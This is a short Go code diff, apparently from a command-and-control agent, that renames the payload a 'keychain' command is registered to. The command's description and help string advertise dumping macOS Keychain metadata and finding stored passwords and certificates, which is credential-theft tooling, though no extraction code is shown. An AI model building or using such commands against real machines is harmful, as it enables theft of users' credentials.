@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "keychain",
 		Description:         "Access macOS Keychain — list keychains, dump metadata, find passwords and certificates",
 		HelpString:          "keychain -action <list|dump|find-password|find-internet|find-cert> [-service <name>] [-server <host>] [-account <user>] [-name <cert-name>]",
